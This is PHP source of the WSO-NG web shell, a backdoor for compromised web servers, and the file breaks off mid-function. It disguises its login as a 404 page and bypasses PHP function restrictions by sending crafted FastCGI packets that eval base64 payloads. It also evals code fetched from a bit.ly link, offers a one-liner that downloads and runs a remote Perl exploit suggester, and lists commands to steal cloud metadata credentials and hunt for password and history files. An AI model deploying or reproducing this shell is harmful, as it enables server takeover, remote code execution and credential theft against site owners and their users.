<?php

// https://github.com/aels/wso-ng/blob/main/wso-ng.php
// by oRb, rework by Aels

preg_match('/.*pass *= ?"?([a-f0-9]{32}).*/si', @file_get_contents($_SERVER['SCRIPT_FILENAME']), $matches);
$auth_pass = "63a9f0ea7bb98050796b649e85481845"; // root
$auth_pass = isset($matches[1]) ? $matches[1] : $auth_pass;

$color = "#df5";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';

try {

	$vt_key = '6366464c1a9e88cc75810e130a60d4647d547cfd6a72319695e820bf0a18d84e';
	$wsoExGentlyUrl = 'https://bit.ly/wsoExGently2';

	ob_implicit_flush(true);
	@ini_set('error_log', NULL);
	@ini_set('log_errors', 0);
	@ini_set('display_errors', 'On');
	@ini_set('max_execution_time', 0);
	@set_time_limit(0);
	@define('WSO_VERSION', '5.5');

	function wsoGetFile($url) {
		$file_path = '/tmp/' . substr(md5($url), 0, 16) . substr(md5(@file_get_contents($_SERVER['SCRIPT_FILENAME'])), 16);
		if (!file_exists($file_path) || file_exists($file_path) && (time() - filemtime($file_path) > 60 * 60 * 24 * 1)) {
			if( function_exists('curl_init') ) {
				$ch = curl_init();
				curl_setopt($ch, CURLOPT_URL, $url);
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
				curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
				curl_setopt($ch, CURLOPT_HEADER, FALSE);
				curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (compatible;)");
				$body = curl_exec($ch);
				curl_close($ch);
			}
			else {
				$body = @file_get_contents($url);
			}
			file_put_contents($file_path, gzdeflate($body));
			return $body;
		} else {
			$body = @file_get_contents($file_path);
			return gzinflate($body) ? gzinflate($body) : $body;
		}
	}
	function wsoLogin() {
		$rand = rand(1e3, 1e4);
		$auth_form = "<form method=post style='position:fixed;left:-1000px;'><input type=text name=pass autofocus=true></form></body>";
		$body = str_replace('/notexist' . $rand, $_SERVER['SCRIPT_NAME'], wsoGetFile('http://' . $_SERVER['HTTP_HOST'] . '/notexist' . $rand));
		$body = stripos($body, '</body>')?str_replace('</body>', $auth_form, $body):$body.$auth_form;
		
		header('HTTP/1.0 404 Not Found');
		die(!empty($body)?$body:$auth_form);
	}
	function WSOsetcookie($k, $v) {
		$_COOKIE[$k] = $v;
		setcookie($k, $v);
	}
	function wsoBreadCrumps() {
		$cwd_links = '';
		$file_path = explode("/", $GLOBALS['cwd']);
		$n = count($file_path);
		for ($i = 0;$i < $n - 1;$i++) {
			$cwd_file_path = '';
			for ($j = 0;$j <= $i;$j++) {
				$cwd_file_path.= $file_path[$j] . '/';
			}
			$cwd_links.= "<a style='color:" . wsoPermsColorOnly($cwd_file_path) . "' " . (wsoPermsColorOnly($cwd_file_path) == '#f18260' ? "" : "onclick=g('FilesMan','" . $cwd_file_path . "')") . ">" . $file_path[$i] . "/</a>";
		}
		$buttons = is_writable($GLOBALS['cwd']) ? '<span class=float-right>
			<a href="#" id="mkdir">[ new dir ]</a> 
			<a href="#" id="mkfile">[ new file ]</a>
			<form method=post ENCTYPE="multipart/form-data">
				<input type=hidden name=a value=FilesMan>
				<input type=hidden name=c value="' . $GLOBALS['cwd'] . '">
				<input type=hidden name=p1 value=uploadFile>
				<a id="uploadfileicon"><object>[ <input class=toolsInp type=file name=f id=uploadfile>upload file ]</object></a>
			</form>
		</span>' : '';
		$filename = preg_match('/FilesTools/', @$_POST['a']) && @$_POST['p1'] ? htmlspecialchars(@basename($_POST['p1'])) : '';
		$filename = $filename ? "<a href=javascript:g('FilesTools',null,'" . $filename . "','" . (is_writable($_POST['p1']) ? 'edit' : 'view') . "') style='color:" . wsoPermsColorOnly($_POST['p1']) . "' >" . $filename . "</a>" : '';
		$console = " <input class='toolsInp hoverable' type=text name=path placeholder='[ change path/file ]' tabindex='0'>";
		echo '<h1>' . $buttons . ' <form onsubmit="g(\'FilesMan\',this.path.value);return false;"><a href=# onclick="g(\'FilesMan\',\'' . $GLOBALS['home_cwd'] . '\',\'\',\'\',\'\');return false;">[ cwd ]</a> ' . $cwd_links . $filename . $console . '</form></h1>';
	}
	// todo: https://antichat.com/threads/470018/
	function wsoUnChain($canary) {

		// https://antichat.com/threads/473143/#post-4353235
		function sendRequest($host, $port, $packet, $test_file) {
			$body = '';
			$headers = '';
			$errno = '';
			$errstr = '';
			$timeout = 1;
			if ($port > 0) $host = "tcp://${host}:${port}/";
			else $host = "unix://${host}";
			$connection = stream_socket_client($host, $errno, $errstr, $timeout);
			if ($connection) {
				stream_set_timeout($connection, 1);
				fputs($connection, $packet);
				while (!feof($connection)) {
					$line = fgets($connection, 4096);
					if ($line == "\r\n") break;
					$headers.= $line;
				}
				while (!feof($connection)) $body.= fgets($connection, 4096);
				fclose($connection);
				if (preg_match('/Primary script unknown|Status: 404 Not Found/si', $headers)) {
					return "<label title='".$headers."'>bypass failed: wrong target script: ".$test_file."</label>";
				} else {
					return "<label title='".$headers."'>Successful</label>";
				}
			} else {
				return "Test failed: no connection:`(";
			}
		}
		function initializeParams($id, $params = array()) {
			$type = 4;
			$data = "";
			foreach ($params as $key => $value) {
				$data.= pack("CN", strlen($key), (1 << 31) | strlen($value));
				$data.= $key;
				$data.= $value;
			}
			return to_s($id, $type, $data);
		}
		function to_s($id, $type, $data = "") {
			$packet = sprintf("\x01%c%c%c%c%c%c\x00", $type, $id / 256, $id % 256, strlen($data) / 256, strlen($data) % 256, strlen($data) % 8);
			$packet.= $data;
			$packet.= str_repeat("\x00", (strlen($data) % 8));
			return $packet;
		}
		function buildPacket($payload, $scriptFile) {
			$payload = base64_encode($payload);
			$packet = "";
			$packet.= to_s(1, 1, "\x00\x01\x00\x00\x00\x00\x00\x00");
			$packet.= initializeParams(1, array("REQUEST_METHOD" => "GET", "SERVER_PROTOCOL" => "HTTP/1.1", "GATEWAY_INTERFACE" => "CGI/1.1", "SERVER_NAME" => "localhost", "HTTP_HOST" => "localhost", "REMOTE_ADDR" => "127.0.0.1", "SCRIPT_FILENAME" => $scriptFile, "PHP_ADMIN_VALUE" => join("\n", ["allow_url_fopen=On", "allow_url_include=On", "disable_functions=Off", "open_basedir=Off", "short_open_tag=On", "auto_prepend_file=data:," . urlencode("<?=eval(base64_decode('${payload}'));?>") ])));
			$packet.= to_s(1, 4);
			$packet.= to_s(1, 5);
			return $packet;
		}
		function findSocket() {
			$connection = @fsockopen('127.0.0.1', 9000, $errno, $errstr, 3);
			if (is_resource($connection)) {
				fclose($connection);
				$fpm_socket = '127.0.0.1';
				$port = 9000;
			} else {
				$it = @glob("/tmp/php*.sock");
				foreach ($it as $f) $fpm_socket = $f;
				try {
					$it = @glob("/var/run/php*.sock");
					foreach ($it as $f) $fpm_socket = $f;
					$it = @glob("/var/run/php-fpm/*.sock");
					foreach ($it as $f) $fpm_socket = $f;
				}
				catch(Exception $e) {
				}
				$port = 0;
			}
			if (!isset($fpm_socket)) {
				return false;
			} else {
				return array($fpm_socket, $port);
			}
		}
		while ( !isset($test_file) ) {
			$it = @glob(dirname(__FILE__)."/*.php");
			foreach ($it as $f) $test_file = $f;
		}
		$fpm_socket = findSocket();
		if (!$fpm_socket) {
			return 'fail to locate socket ;(';
		}
		$result = sendRequest($fpm_socket[0], $fpm_socket[1], buildPacket($canary, $test_file), $test_file);
		if (preg_match('/success/i', $result)) {
			return $result;
		} else {
			return $result;
		}
	}

	if (!empty($auth_pass)) {
		if (isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass)) WSOsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);
		if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) ]) || ($_COOKIE[md5($_SERVER['HTTP_HOST']) ] != $auth_pass)) wsoLogin();
	}

	$os = (strtolower(substr(PHP_OS, 0, 3)) == "win")?'win':'nix';
	$safe_mode = @ini_get('safe_mode');
	if (!$safe_mode) error_reporting(0);
	$disable_functions = @ini_get('disable_functions');
	$open_base_dir = @ini_get('open_basedir');
	if ( $disable_functions || $open_base_dir ) {
		$chains_bypassed = wsoUnChain('$chains_bypassed=true;');
	}
	if( $disable_functions ) {
		// define wsoExGently();
		eval(wsoGetFile($wsoExGentlyUrl));
	}

	$home_cwd = @getcwd();
	if (isset($_POST['c'])) @chdir($_POST['c']);
	$cwd = @getcwd();

	if ($os == 'win') {
		$home_cwd = str_replace("\\", "/", $home_cwd);
		$cwd = str_replace("\\", "/", $cwd);
	}
	if ($cwd[strlen($cwd) - 1] != '/') $cwd.= '/';

	if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'])) $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool)$default_use_ajax;

	if ($os == 'win') $aliases = array("List Directory" => "dir", "Find index.php in current dir" => "dir /s /w /b index.php", "Find *config*.php in current dir" => "dir /s /w /b *config*.php", "Show active connections" => "netstat -an", "Show running services" => "net start", "User accounts" => "net user", "Show computers" => "net view", "ARP Table" => "arp -a", "IP Configuration" => "ipconfig /all");
	else $aliases = array("Fetch AWS metadata" => "curl -Ss http://169.254.169.254/latest/meta-data/identity-credentials/", "List dir" => "ls -lha", "list file attributes on a Linux second extended file system" => "lsattr -va", "show opened ports" => "netstat -an | grep -i listen", "process status" => "ps aux", "Find" => "", "find all suid files" => "find / -type f -perm -04000 -ls", "find suid files in current dir" => "find . -type f -perm -04000 -ls", "find all sgid files" => "find / -type f -perm -02000 -ls", "find sgid files in current dir" => "find . -type f -perm -02000 -ls", "find config.inc.php files" => "find / -type f -name config.inc.php", "find config* files" => "find / -type f -name \"config*\"", "find config* files in current dir" => "find . -type f -name \"config*\"", "find all writable folders and files" => "find / -perm -2 -ls", "find all writable folders and files in current dir" => "find . -perm -2 -ls", "find all service.pwd files" => "find / -type f -name service.pwd", "find service.pwd files in current dir" => "find . -type f -name service.pwd", "find all .htpasswd files" => "find / -type f -name .htpasswd", "find .htpasswd files in current dir" => "find . -type f -name .htpasswd", "find all .bash_history files" => "find / -type f -name .bash_history", "find .bash_history files in current dir" => "find . -type f -name .bash_history", "find all .fetchmailrc files" => "find / -type f -name .fetchmailrc", "find .fetchmailrc files in current dir" => "find . -type f -name .fetchmailrc", "Locate" => "", "locate httpd.conf files" => "locate httpd.conf", "locate vhosts.conf files" => "locate vhosts.conf", "locate proftpd.conf files" => "locate proftpd.conf", "locate psybnc.conf files" => "locate psybnc.conf", "locate my.conf files" => "locate my.conf", "locate admin.php files" => "locate admin.php", "locate cfg.php files" => "locate cfg.php", "locate conf.php files" => "locate conf.php", "locate config.dat files" => "locate config.dat", "locate config.php files" => "locate config.php", "locate config.inc files" => "locate config.inc", "locate config.inc.php" => "locate config.inc.php", "locate config.default.php files" => "locate config.default.php", "locate config* files " => "locate config", "locate .conf files" => "locate '.conf'", "locate .pwd files" => "locate '.pwd'", "locate .sql files" => "locate '.sql'", "locate .htpasswd files" => "locate '.htpasswd'", "locate .bash_history files" => "locate '.bash_history'", "locate .mysql_history files" => "locate '.mysql_history'", "locate .fetchmailrc files" => "locate '.fetchmailrc'", "locate backup files" => "locate backup", "locate dump files" => "locate dump", "locate priv files" => "locate priv");
	
	function wsoHeader() {
		$_POST['charset'] = $GLOBALS['default_charset'];
		global $color;
		global $vt_key;
		global $open_base_dir;
		global $chains_bypassed;
		echo "<html><head>
		<link href='//cdn.jsdelivr.net/npm/bootstrap/dist/css/bootstrap.min.css' rel='stylesheet'>
		<script src='//cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js'></script>
		<script src='//cdn.jsdelivr.net/npm/bootstrap/dist/js/bootstrap.bundle.min.js'></script>
		<meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'>
		<title>" . $_SERVER['HTTP_HOST'] . " - WSO " . WSO_VERSION . "</title>
	<style>
	@import url('https://fonts.googleapis.com/css2?family=Outfit&family=Teko:wght@300&display=swap');
	:root {
		--main-color: $color;
		--text-green: #2bb24c;
		--text-orange: #ffbd2f;
		--text-red: #f18260;
		// --text-red: #c41e25;
		--text-muted: #888;
	}
	body{background-color:#444;color:#e1e1e1;}
	body,td,th{ font: 9pt Lucida,Verdana;margin:0;vertical-align:top;color:#e1e1e1; }
	table.info{ color:#fff;background-color:#222; }
	span,h1,a,a:hover{ color: var(--main-color); }
	a { cursor: pointer; }
	.text-red { color: var(--text-red); }
	.text-green{ color: var(--text-green); }
	span{ font-weight: bolder; }
	h1{ border-left:5px solid var(--main-color);padding: 2px 5px;font: 20px 'Teko', sans-serif;background-color:#222;margin:0px; }
	div.content{ padding: 5px;margin-left:5px;background-color:#333; }
	a{ text-decoration:none; }
	a:hover{ text-decoration:underline; }
	.ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }
	.bigarea{ width:100%;height:300px; }
	input,textarea,select,button{ margin:0;color:#fff;background-color:#555;border:1px solid var(--main-color); font: 12pt Monospace,'Courier New'; }
	textarea{ width:100%; height:600px; font: 9pt Monospace,'Courier New'; }
	.hoverable { border: 1px solid transparent; background: transparent; }
	h1 .hoverable { padding: 2px 5px;font: 20px 'Teko', sans-serif; }
	.hoverable:focus { border:1px solid var(--main-color);; }
	form{ margin:0px; display: inline-block; }
	#mkdir,#mkfile,#uploadfile { color:var(--main-color); width:150px; }
	#uploadfile { width:75px; opacity:0; position:absolute; left:0; z-index:100; cursor:pointer; }
	#uploadfileicon { position: relative; }
	#toolsTbl{ text-align:center; }
	.toolsInp{ width: 300px }
	.main th{text-align:left;background-color:#5e5e5e;}
	.main tr:hover{background-color:#5e5e5e}
	.l1{background-color:#444}
	.l2{background-color:#333}
	pre{font-family:Courier,Monospace;}
	.file-actions { display:none; }
	.touch-field { font: 9pt Lucida,Verdana; }
	.float-right { float:right; }

	</style>
	<script>
		var c_ = '" . htmlspecialchars($GLOBALS['cwd']) . "';
		var a_ = '" . htmlspecialchars(@$_POST['a']) . "'
		var charset_ = 'UTF-8';
		var p1_ = '" . ((strpos(@$_POST['p1'], "\n") !== false) ? '' : htmlspecialchars($_POST['p1'], ENT_QUOTES)) . "';
		var p2_ = '" . ((strpos(@$_POST['p2'], "\n") !== false) ? '' : htmlspecialchars($_POST['p2'], ENT_QUOTES)) . "';
		var p3_ = '" . ((strpos(@$_POST['p3'], "\n") !== false) ? '' : htmlspecialchars($_POST['p3'], ENT_QUOTES)) . "';
		var d = document;
		function set(a,c,p1,p2,p3) {
			self.mf.a.value=a||a_;
			self.mf.c.value=c||c_;
			self.mf.p1.value=p1||p1_;
			self.mf.p2.value=p2||p2_;
			self.mf.p3.value=p3||p3_;
		}
		function g(a,c,p1,p2,p3) {
			set(a,c,p1,p2,p3);
			console.log(a,c,p1,p2,p3);
			self.mf.submit();
			return false;
		}
		function a(a,c,p1,p2,p3) {
			set(a,c,p1,p2,p3);
			var params = 'ajax=true';
			for(i=0;i<self.mf.elements.length;i++)
				params += '&'+self.mf.elements[i].name+'='+encodeURIComponent(self.mf.elements[i].value);
			sr('" . addslashes($_SERVER['REQUEST_URI']) . "', params);
		}
		function sr(url, params) {
			$.ajax({
				type: 'POST',
				url: url,
				contentType: 'application/x-www-form-urlencoded; charset=utf-8',
				data: params,
				success: function (text) { text.split('\\n').map(function(a){/PhpOutput|strOutput|self\\.cf/.test(a)&&eval(a)}) },
				error: function () { alert('Request error!') }
			});
		}
	</script>
	<head><body><div style='position:absolute;width:100%;background-color:#444;top:0;left:0;'>
	<form method=post name=mf style='display:none;'>
	<input type=hidden name=a>
	<input type=hidden name=c>
	<input type=hidden name=p1>
	<input type=hidden name=p2>
	<input type=hidden name=p3>
	</form>";
		$freeSpace = @diskfreespace($GLOBALS['cwd']);
		$totalSpace = @disk_total_space($GLOBALS['cwd']);
		$totalSpace = $totalSpace ? $totalSpace : 1;
		$release = @php_uname('r');
		$kernel = @php_uname('s');
		$explink = 'curl -fskSL bit.ly/autoexp2 > /tmp/auto.pl; perl /tmp/auto.pl; rm -f /tmp/auto.pl;';
		$ipv4infolink = 'https://addon.dnslytics.net/ipv4info/v1/';
		$_SERVER["SERVER_ADDR"] = wsoGetFile('https://api.my-ip.io/ip');
		$vt_detections = preg_replace('/^(.*"response_code": ?)(\d+)(, ?".*)|(.+"positives": )(\d{1,2})(, "total.+)$/', '$2$5', wsoGetFile('https://www.virustotal.com/vtapi/v2/url/report?resource=' . $_SERVER["SERVER_ADDR"] . '&apikey=' . $vt_key));
		$vt_detections = $vt_detections != 0 ? '<b class=text-danger>' . $vt_detections . '</b>' : $vt_detections;
		$ip_data = preg_replace('/(.+"countryCode":")([A-Z]{2})(",".+"isp":")(.+)(","org".+)|(.*"message":")(.+)(","query")(.*)/si', '$2$7, $4', wsoGetFile('http://demo.ip-api.com/json/' . $_SERVER["SERVER_ADDR"] . '?fields=66842623&lang=en'));
		preg_match('/"ndomains":(\d+),/si', wsoGetFile($ipv4infolink . $_SERVER["SERVER_ADDR"]), $matches);
		$domains_count = isset($matches[1])?$matches[1]:'-';
		$ram_size = file_exists('/proc/meminfo') ? preg_replace('/(.*MemTotal: +)(\d+)(\d{3})( kB.*)/', '$2 Mb', file('/proc/meminfo') [0]) : '--';
		$ram_free = file_exists('/proc/meminfo') ? preg_replace('/(.*MemFree: +)(\d+)(\d{3})( kB.*)/', '$2 Mb', file('/proc/meminfo') [1]) : '--';
		if (!function_exists('posix_getegid')) {
			$user = @get_current_user();
			$uid = @getmyuid();
			$gid = @getmygid();
			$group = "?";
		} else {
			$uid = @posix_getpwuid(posix_geteuid());
			$gid = @posix_getgrgid(posix_getegid());
			$user = $uid['name'];
			$uid = $uid['uid'];
			$group = $gid['name'];
			$gid = $gid['gid'];
		}
		$m = array('Sec. Info' => 'SecInfo', 'Files' => 'FilesMan', 'Console' => 'Console', 'Sql' => 'Sql', 'Php' => 'Php', 'String tools' => 'StringTools', 'Bruteforce' => 'Bruteforce', 'Network' => 'Network');
		$menu = '';
		foreach ($m as $k => $v) $menu.= '<th width="' . (int)(100 / count($m)) . '%"><h1><a href="#" onclick="g(\'' . $v . '\',null,\'\',\'\',\'\'); return !1;">[ ' . $k . ' ]</a></h1></th>';
		echo '<table class=info cellpadding=3 cellspacing=0 width=100%><tr>
				<td><span>Uname:<br>Server IP:<br>User:<br>Php:<br>Hardware:<br></span></td>' . '<td><nobr>' . substr(@php_uname(), 0, 120) . ' <a href="#" title="' . $explink . '" onclick="g(\'Console\',null,this.title);return false;">[exploit-suggester v2]</a></nobr><br>
				<u class="copy" title="' . $_SERVER["SERVER_ADDR"] . '">' . $_SERVER["SERVER_ADDR"] . '</u> (' . $ip_data . '), <span>' . $domains_count . '</span> domains. <a href="https://securitytrails.com/list/ip/' . @$_SERVER["SERVER_ADDR"] . '">[ securitytrails ]</a> <a href="https://www.virustotal.com/gui/ip-address/' . $_SERVER["SERVER_ADDR"] . '">[ virustotal (' . $vt_detections . '/56) ]</a> <a href="https://publicwww.com/websites/ip%3A' . $_SERVER["SERVER_ADDR"] . '/">[ publicwww ]</a><br>
				' . $uid . ' ( ' . $user . ' ) <span>Group:</span> ' . $gid . ' ( ' . $group . ' )' . ($open_base_dir || $chains_bypassed === true ? ', <span>Open base dir:</span> ' . $open_base_dir . ' (' . ($chains_bypassed === true ? '<a class="text-green">bypassed</a>' : $chains_bypassed) . ')' : '') . '<br>
				' . @phpversion() . ' <span>Safe mode:</span> ' . ($GLOBALS['safe_mode'] ? '<font class=text-red>ON</font>' : '<font class=text-green><b>OFF</b></font>') . ' <a href=# onclick="g(\'Php\',null,\'\',\'info\')">[ phpinfo ]</a><br>
				<span>disk:</span> total ' . wsoViewSize($totalSpace) . ', free ' . wsoViewSize($freeSpace) . ' (' . (int)($freeSpace / $totalSpace * 100) . '%), <span>ram</span> total: ' . $ram_size . ', free: ' . $ram_free . ', <span>cores:</span> ' . (file_exists('/proc/cpuinfo') ? substr_count('' . @file_get_contents('/proc/cpuinfo'), "processor") : '--') . ', <span>loadavg:</span> ' . substr(end(@sys_getloadavg()), 0, 4) . '</td>' . '<td width=200></td></tr></table>' . 
				'<table style="border-top:2px solid #333;" cellpadding=3 cellspacing=0 width=100%><tr>' . $menu . '</tr></table><div style="margin:5">';
	}
	function wsoFooter() {
		echo "
					</div>
				<script src='//aels.github.io/textarea-editor/textarea-editor.js'></script>
				<script>
					Clipboard = function(){ var a;return{copy:function(b){a=document.createElement('textArea');a.value=b;document.body.appendChild(a);if(navigator.userAgent.match(/ipad|iphone/i)){b=document.createRange();b.selectNodeContents(a);var c=window.getSelection();c.removeAllRanges();c.addRange(b);a.setSelectionRange(0,999999)}else a.select();document.execCommand('copy');document.body.removeChild(a)}} }();
					document.querySelectorAll('.copy').forEach(function(a){ a.onclick = function() {
						Clipboard.copy(a.title.replace(/(\\[ | \\])/g,''));
						a.classList.add('text-green');
						setTimeout(function(){a.classList.remove('text-green')},1e3);
						return false;
					}});
					document.querySelectorAll('input[type=checkbox]').forEach(function(a){a.onclick=function(){document.querySelector('.file-actions').style.display='table-cell'}});
					document.querySelectorAll('input[type=checkbox]').forEach(function(a){a.onclick=function(){document.querySelector('.file-actions').style.display='table-cell'}});
					document.querySelectorAll('input.touch-field[type=text]').forEach(function(a){a.onkeydown=function(e){if(e.keyCode===13&&this.value){ g('FilesTools',null,this.title,'touch',this.value);this.classList.add('text-green'); return false; }}});
					document.querySelectorAll('#mkdir').forEach(function(a){ a.onclick = function(e) { g('FilesMan',null,prompt('enter directory name'),'mkdir'); mkdir.classList.add('text-green'); return false; }});
					document.querySelectorAll('#mkfile').forEach(function(a){ a.onclick = function(e) { g('FilesTools',null,prompt('enter file name'),'mkfile'); mkfile.classList.add('text-green'); return false; }});
					document.querySelectorAll('#uploadfile').forEach(function(a){ a.onchange = function(e) { if(this.value) { uploadfile.form.submit(); uploadfile.classList.add('text-green'); } }});
					tryToSave = function(e) {
						if( (e.metaKey||e.ctrlKey) && (e.keyCode==0xA||e.keyCode==0xD) ) {
							g(null,null,textarea.title,'edit',textarea.value);
							e.preventDefault();
							return false;
						}
					};
					tryToRun = function(e) {
						if( (e.metaKey||e.ctrlKey) && (e.keyCode==0xA||e.keyCode==0xD) ) {
							a('Php',null,PhpCode.value);
							PhpCode.classList.add('text-green');
							setTimeout(function(){PhpCode.classList.remove('text-green')},1e3);
							e.preventDefault();
							return false;
						}
					};
				</script>
			</div>
			</body></html>";
	}
	if (!function_exists("posix_getpwuid") && (strpos($GLOBALS['disable_functions'], 'posix_getpwuid') === false)) {
		function posix_getpwuid($p) {
			return false;
		}
	}
	if (!function_exists("posix_getgrgid") && (strpos($GLOBALS['disable_functions'], 'posix_getgrgid') === false)) {
		function posix_getgrgid($p) {
			return false;
		}
	}
	function wsoGetOpenPorts() {
		$address = '127.0.0.1';
		$ports = '1,3,4,6,7,9,13,17,19,20,21,22,23,24,25,26,30,32,33,37,42,43,49,53,70,79,80,81,82,83,84,85,88,89,90,99,100,106,109,110,111,113,119,125,135,139,143,144,146,161,163,179,199,211,212,222,254,255,256,259,264,280,301,306,311,340,366,389,406,407,416,417,425,427,443,444,445,458,464,465,481,497,500,512,513,514,515,524,541,543,544,545,548,554,555,563,587,593,616,617,625,631,636,646,648,666,667,668,683,687,691,700,705,711,714,720,722,726,749,765,777,783,787,800,801,808,843,873,880,888,898,900,901,902,903,911,912,981,987,990,992,993,995,999,1000,1001,1002,1007,1009,1010,1011,1021,1022,1023,1024,1025,1026,1027,1028,1029,1030,1031,1032,1033,1034,1035,1036,1037,1038,1039,1040,1041,1042,1043,1044,1045,1046,1047,1048,1049,1050,1051,1052,1053,1054,1055,1056,1057,1058,1059,1060,1061,1062,1063,1064,1065,1066,1067,1068,1069,1070,1071,1072,1073,1074,1075,1076,1077,1078,1079,1080,1081,1082,1083,1084,1085,1086,1087,1088,1089,1090,1091,1092,1093,1094,1095,1096,1097,1098,1099,1100,1102,1104,1105,1106,1107,1108,1110,1111,1112,1113,1114,1117,1119,1121,1122,1123,1124,1126,1130,1131,1132,1137,1138,1141,1145,1147,1148,1149,1151,1152,1154,1163,1164,1165,1166,1169,1174,1175,1183,1185,1186,1187,1192,1198,1199,1201,1213,1216,1217,1218,1233,1234,1236,1244,1247,1248,1259,1271,1272,1277,1287,1296,1300,1301,1309,1310,1311,1322,1328,1334,1352,1417,1433,1434,1443,1455,1461,1494,1500,1501,1503,1521,1524,1533,1556,1580,1583,1594,1600,1641,1658,1666,1687,1688,1700,1717,1718,1719,1720,1721,1723,1755,1761,1782,1783,1801,1805,1812,1839,1840,1862,1863,1864,1875,1900,1914,1935,1947,1971,1972,1974,1984,1998,1999,2000,2001,2002,2003,2004,2005,2006,2007,2008,2009,2010,2013,2020,2021,2022,2030,2033,2034,2035,2038,2040,2041,2042,2043,2045,2046,2047,2048,2049,2065,2068,2082,2083,2099,2100,2103,2105,2106,2107,2111,2119,2121,2126,2135,2144,2160,2161,2170,2179,2190,2191,2196,2200,2222,2251,2260,2288,2301,2323,2366,2375,2376,2381,2382,2383,2393,2394,2399,2401,2492,2500,2522,2525,2557,2601,2602,2604,2605,2607,2608,2638,2701,2702,2710,2717,2718,2725,2800,2809,2811,2869,2875,2909,2910,2920,2967,2968,2998,3000,3001,3003,3005,3006,3007,3011,3013,3017,3030,3031,3052,3071,3077,3128,3168,3211,3221,3260,3261,3268,3269,3283,3300,3301,3306,3322,3323,3324,3325,3333,3351,3367,3369,3370,3371,3372,3389,3390,3404,3476,3493,3517,3527,3546,3551,3580,3659,3689,3690,3703,3737,3766,3784,3800,3801,3809,3814,3826,3827,3828,3851,3869,3871,3878,3880,3889,3905,3914,3918,3920,3945,3971,3986,3995,3998,4000,4001,4002,4003,4004,4005,4006,4045,4111,4125,4126,4129,4224,4242,4279,4321,4343,4443,4444,4445,4446,4449,4550,4567,4662,4848,4899,4900,4998,5000,5001,5002,5003,5004,5009,5030,5033,5050,5051,5054,5060,5061,5080,5087,5100,5101,5102,5120,5190,5200,5214,5221,5222,5225,5226,5269,5280,5298,5357,5405,5414,5431,5432,5440,5500,5510,5544,5550,5555,5560,5566,5631,5633,5666,5678,5679,5718,5730,5800,5801,5802,5810,5811,5815,5822,5825,5850,5859,5862,5877,5900,5901,5902,5903,5904,5906,5907,5910,5911,5915,5922,5925,5950,5952,5959,5960,5961,5962,5963,5987,5988,5989,5998,5999,6000,6001,6002,6003,6004,6005,6006,6007,6009,6025,6059,6100,6101,6106,6112,6123,6129,6156,6346,6379,6389,6502,6510,6543,6547,6565,6566,6567,6580,6646,6666,6667,6668,6669,6689,6692,6699,6778,6779,6788,6789,6792,6839,6881,6901,6969,7000,7001,7002,7004,7007,7019,7025,7070,7100,7103,7106,7200,7201,7402,7435,7443,7496,7512,7625,7627,7676,7741,7777,7778,7800,7911,7920,7921,7937,7938,7999,8000,8001,8002,8007,8008,8009,8010,8011,8021,8022,8031,8042,8045,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8093,8099,8100,8180,8181,8192,8193,8194,8200,8222,8254,8290,8291,8292,8300,8333,8383,8400,8402,8443,8500,8600,8649,8651,8652,8654,8701,8800,8873,8888,8899,8994,9000,9001,9002,9003,9009,9010,9011,9040,9050,9071,9080,9081,9090,9091,9099,9100,9101,9102,9103,9110,9111,9200,9207,9220,9290,9415,9418,9485,9500,9502,9503,9535,9575,9593,9594,9595,9618,9666,9876,9877,9878,9898,9900,9917,9929,9943,9944,9968,9998,9999,10000,10001,10002,10003,10004,10009,10010,10012,10024,10025,10082,10180,10215,10243,10566,10616,10617,10621,10626,10628,10629,10778,11110,11111,11211,11967,12000,12174,12265,12345,13456,13722,13782,13783,14000,14238,14441,14442,15000,15002,15003,15004,15660,15742,16000,16001,16012,16016,16018,16080,16113,16992,16993,17877,17988,18040,18101,18988,19101,19283,19315,19350,19780,19801,19842,20000,20005,20031,20221,20222,20828,21571,22939,23502,24444,27017,27018,24800,25734,25735,26214,27000,27352,27353,27355,27356,27715,28201,30000,30718,30951,31038,31337,32768,32769,32770,32771,32772,32773,32774,32775,32776,32777,32778,32779,32780,32781,32782,32783,32784,32785,33354,33899,34571,34572,34573,35500,38292,40193,40911,41511,42510,44176,44442,44443,44501,45100,48080,49152,49153,49154,49155,49156,49157,49158,49159,49160,49161,49163,49165,49167,49175,49176,49400,49999,50000,50001,50002,50003,50006,50300,50389,50500,50636,50800,51103,51493,52673,52822,52848,52869,54045,54328,55055,55056,55555,55600,56737,56738,57294,57797,58080,60020,60443,61532,61900,62078,63331,64623,64680,65000,65129,65389';
		$db = wsoGetFile('https://bit.ly/port2service');
		$ports = explode(',', $ports);
		$open_ports = '';
		foreach ($ports as $port) {
			$connection = @fsockopen($address, $port, $errno, $errstr, 3);
			if (is_resource($connection)) {
				fclose($connection);
				preg_match_all("#Service Name: ((?!unknown).+),Port No: $port,Protocol: tcp#", $db, $matches);
				$open_ports.= $port . ': ' . (isset($matches[1]) ? end($matches[1]) : 'unknown') . "\n";
			}
		}
		try{
			$it = @glob("/tmp/*.sock");
			foreach ($it as $f) {
				$open_ports.= $f . "\n";
			}
			$it = @glob("/var/run/*.sock");
			foreach ($it as $f) {
				$open_ports.= $f . "\n";
			}
			$it = @glob("/run/*/*.sock");
			foreach ($it as $f) {
				$open_ports.= $f . "\n";
			}
		}
		catch(Exception $e) {
		}
		return $open_ports;
	}
	function wsoGetCronJobs() {
		$cron_tabs = array("/var/spool/cron/crontabs/*","/etc/cron.*/*","/etc/cronta*");
		$files = array();
		try{
			foreach ($cron_tabs as $dir) {
				foreach (@glob($dir) as $file) {
					if( @is_readable($file) ) {
						if( @is_writeable($file) ) {
							$files[$file][] = 'writable';
						}
						foreach(@file($file) as $line) {
							$matches = null;
							preg_match('# (/\S+) #i', $line, $matches);
